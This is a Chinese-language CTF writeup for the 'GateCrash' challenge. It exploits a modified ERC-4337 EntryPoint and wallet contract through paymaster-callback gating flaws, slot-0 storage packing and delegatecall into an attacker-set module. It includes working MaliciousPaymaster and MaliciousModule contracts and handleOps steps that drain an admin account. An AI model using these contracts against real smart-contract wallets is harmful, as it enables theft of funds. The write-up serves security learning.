# GateCrash Writeup

### 1. 背景分析

这个挑战所涉及的ERC-4337定义了一种无需修改共识层的账户抽象方案，核心是 `EntryPoint` 合约，负责验证和执行 `UserOperation`。标准的 ERC-4337 中，`handleOps` 函数处理批量 `UserOperation` 时有验证和执行两个阶段：

1. 在验证时依次调用每个 `UserOperation` 的 `sender.validateUserOp()` 和 `paymaster.validatePaymasterUserOp()`；
2. 而执行阶段，则会依次执行每个 `UserOperation` 的 `callData`；

此题的 `EntryPoint` 合约在此基础上引入了多项优化功能，而在这些非原标准合约下的优化中存在的漏洞给了我们攻击的可能。

---

### 2. 漏洞总结

| 编号 | 位置 | 漏洞类型 | 描述 |
|------|------|----------|------|
| Vuln #1 | EntryPoint.sol | Paymaster 回调滥用 | `addToPreApproved()` 仅限 `_inPaymasterValidation` 阶段调用，但恶意 Paymaster 可在验证回调中触发 |
| Vuln #2 | EntryPoint.sol | Paymaster 回调滥用 | `adminUpdateModule()` 仅限 `_inPaymasterValidation` 阶段调用，但恶意 Paymaster 可在验证回调中触发 |
| Vuln #3 | BaseAccount.sol | 存储槽打包 | `owner`/`validationModuleFlag`/`validationModule` 共占 slot 0 |
| Vuln #4 | BaseAccount.sol | delegatecall 注入 | `_delegateToModule` 通过 delegatecall 执行外部代码 |

#### 2.1 Vuln #1: EntryPoint 白名单仅限 Paymaster 验证阶段

```solidity
// EntryPoint.sol
function addToPreApproved(address sender) external override {
    require(_inPaymasterValidation, "EP: only during paymaster validation");
    preApprovedSenders[sender] = true;
    emit PreApprovedSenderAdded(sender);
}
```

该函数仅在 `_inPaymasterValidation == true` 时可调用，此标志在 `_validatePrepayment` 调用 Paymaster 的 `validatePaymasterUserOp` 期间为真。攻击者需部署恶意 Paymaster 合约，在其验证回调中触发白名单添加。

#### 2.2 Vuln #2: EntryPoint 模块更新仅限 Paymaster 验证阶段

```solidity
function adminUpdateModule(address account, address newModule) external override {
    require(_inPaymasterValidation, "EP: only during paymaster validation");
    (bool success, ) = account.call(
        abi.encodeWithSignature("updateValidationModule(address)", newModule)
    );
    require(success, "EP: module update failed");
}
```

与 `addToPreApproved` 同级门禁，同样需要通过恶意 Paymaster 在验证回调中触发。外部 EOA 直调或模块 delegatecall 路径均被封堵。

#### 2.3 Vuln #3: BaseAccount 存储槽打包

```solidity
// BaseAccount.sol
address public owner;               // slot 0, offset 0   (20 bytes)
uint48 public validationModuleFlag; // slot 0, offset 20  (6 bytes)
address public validationModule;    // slot 0, offset 26  (20 bytes)
```

由于solidity编译器的存储槽打包优化，这三个变量共用同一个存储槽slot 0。这意味着：
- `owner` 存储在 slot 0 的低 20 字节
- `validationModuleFlag` 存储在 slot 0 的偏移 20 字节处
- `validationModule` 存储在 slot 0 的偏移 26 字节处

因此对slot 0的整体写入（如 `sstore(0, 0)`）会同时清零 `owner`、`validationModuleFlag` 和 `validationModule`

#### 2.4 Vuln #4: delegatecall 注入

`delegatecall` 在调用者的存储上下文中执行被调用合约的代码。假如 `validationModule` 指向恶意合约，该合约可以通过 `sstore(0, 0)` 直接覆盖slot 0，清零 `owner`

```solidity
// BaseAccount.sol
function _delegateToModule(UserOperation calldata userOp, bytes32 userOpHash) internal {
    bytes memory data = abi.encodeWithSignature(
        "preValidate(address,bytes32)",
        userOp.sender,
        userOpHash
    );
    (bool modSuccess, ) = validationModule.delegatecall(data);
    ...
}
```


---

### 3. 攻击流程图

```
handleOps([Op[0], Op[1]])
│
├─ 验证阶段
│  ├─ _validatePrepayment(Op[0])
│  │  ├─ attackerAccount.validateUserOp() ✓ (攻击者持有私钥，正常签名验证通过)
│  │  └─ maliciousPaymaster.validatePaymasterUserOp()  [_inPaymasterValidation = true]
│  │     ├─ entryPoint.addToPreApproved(adminAccount)    ← [Vuln #1: 门禁满足]
│  │     └─ entryPoint.adminUpdateModule(admin, module)  ← [Vuln #2: 门禁满足]
│  │
│  └─ _validatePrepayment(Op[1])
│     └─ adminAccount.validateUserOp()
│        ├─ _delegateToModule(userOp, opHash)
│        │  └─ maliciousModule.preValidate() via delegatecall
│        │     └─ sstore(0, 0)  ← [Vuln #3+#4: 覆盖 owner 为 address(0)]
│        └─ preApprovedSenders[admin] == true
│           → 跳过签名验证 ✓ ← [绕过成功，_recoverSigner 不触发]
│
└─ 执行阶段
   └─ _executeUserOp(Op[1])
      └─ adminAccount.execute(attacker, 10 ETH, "")
         → 资金被转走 ✓
```

---

## 解题步骤

### Step 1: 部署MaliciousModule

```solidity
contract MaliciousModule {
    function preValidate(address, bytes32) external {
        assembly {
            sstore(0, 0)  // 覆盖调用者的slot 0(owner + validationModuleFlag + validationModule)
        }
    }
}
```

### Step 2: 部署MaliciousPaymaster

```solidity
contract MaliciousPaymaster {
    IEntryPoint public immutable entryPoint;
    address public target;
    address public mod;

    function validatePaymasterUserOp(UserOperation calldata, bytes32, uint256)
        external returns (bytes memory context, uint256 validationData) {
        entryPoint.addToPreApproved(target);       // Vuln #1
        entryPoint.adminUpdateModule(target, mod);  // Vuln #2
        context = new bytes(0);
        validationData = 0;
    }
}
```

### Step 3: 获取nonce

```python
attacker_nonce = attacker_account.functions.nonce().call()
admin_nonce = admin_account.functions.nonce().call()
```

### Step 4: 构造两个UserOperation

1. Op[0]：攻击操作，携带MaliciousPaymaster
2. Op[1]：admin转账操作，签名任意（白名单快速通道）

### Step 5: 调用handleOps

```python
entry_point.functions.handleOps([attacker_op, admin_op], attacker_addr).transact()
```

### Step 6: 验证结果

admin账户余额为0，攻击者获得资金